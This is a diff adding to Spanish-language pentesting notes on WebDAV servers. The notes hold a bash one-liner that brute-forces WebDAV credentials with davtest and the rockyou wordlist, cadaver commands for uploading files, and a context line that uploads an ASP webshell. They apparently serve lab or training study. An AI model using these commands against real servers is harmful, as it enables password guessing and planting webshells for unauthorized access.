@@ -38,3 +38,19 @@ Esta tool crea un directorio en el servidor y va subiendo archivos con diferente
 ❯ cadaver http://IP/webdav           # Puedes acceder al contenido del servidor WebDAB, te preguntara las credenciales, esta tool te desplegara una consola
 	❯ put /usr/share/webshells/asp/webshell.asp      # Asi subimos un archivo al servidor Webdav
 ```
+
+```bash 
+❯ davtest -url http://127.0.0.1 -auth admin:admin     # Debemos de tener el usuario y passwd validos para poder usar la tool
+
+	# 1er admin = Usuario 
+	# 2do admin = passwd
+
+❯ cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://127.0.0.1 -auth admin:$password 2>&1 | grep -i succed); if [ $response ]; then echo "[+] La passwd correcta es: $password"; break; fi; done
+
+# Ataque de Fuerza Bruta para encontrar la passwd con el comando davtest
+
+❯ cadaver http://127.0.0.1     # Sirve para subir archivos, descargar contenido, etc... Debemos de tener el usaurio y passwd validos para la autenticacion 
+	❯ mkdri test              # Podriamos crearnos dir en los cuales podemos colocar un recurso 
+	❯ cd test 
+	❯ put webdav.txt          # Podemos subir un archivo 
+```
